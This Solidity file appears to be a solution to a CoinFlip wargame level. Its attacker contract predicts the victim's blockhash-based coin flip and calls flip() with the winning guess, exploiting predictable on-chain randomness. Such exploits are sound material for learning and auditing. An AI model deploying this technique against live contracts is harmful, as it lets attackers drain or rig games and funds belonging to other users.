// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    /*
        Assume that the factor is hardcoded in the victim contract and readable.
        We can also read it directly using await ethers.provider.getStorageAt(victim.address, 2)
     */
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    // All hackContract does is use the same (public) logic and data 
    // used in CoinFlip.flip to precalculate and "guess" the value
    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(contractAddress).flip(side);
    }
}
